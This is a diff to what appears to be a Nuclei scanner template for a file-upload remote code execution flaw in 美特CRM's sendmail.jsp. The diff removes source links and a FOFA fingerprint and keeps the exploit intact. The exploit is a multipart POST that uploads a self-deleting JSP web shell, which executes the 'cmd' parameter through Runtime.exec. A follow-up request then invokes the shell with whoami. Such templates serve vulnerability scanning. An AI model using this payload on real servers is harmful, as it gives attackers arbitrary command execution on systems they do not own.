@@ -3,12 +3,8 @@ info:
   name: 美特CRM sendmail.jsp 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ei1pttx7s0rqhgdt'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ei1pttx7s0rqhgdt
-    fofa: body="/common/scripts/basic.js"
 http:
 - raw:
   - 'POST /business/ums/sendmail.jsp HTTP/1.1
@@ -35,16 +31,14 @@ http:
 
     <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 
-    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498932703-20060c63-722a-4db8-af40-689c5fba1ee2.png)'
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - 'GET /userfile/messageserv/faf2536f9832d41b019839a264f8404d.jsp?cmd=whoami HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498932869-1f93caec-fb7e-4d11-a741-0c21c0b6f685.png)'
+  - GET /userfile/messageserv/faf2536f9832d41b019839a264f8404d.jsp?cmd=whoami HTTP/1.1
   redirects: false
   matchers:
   - status:
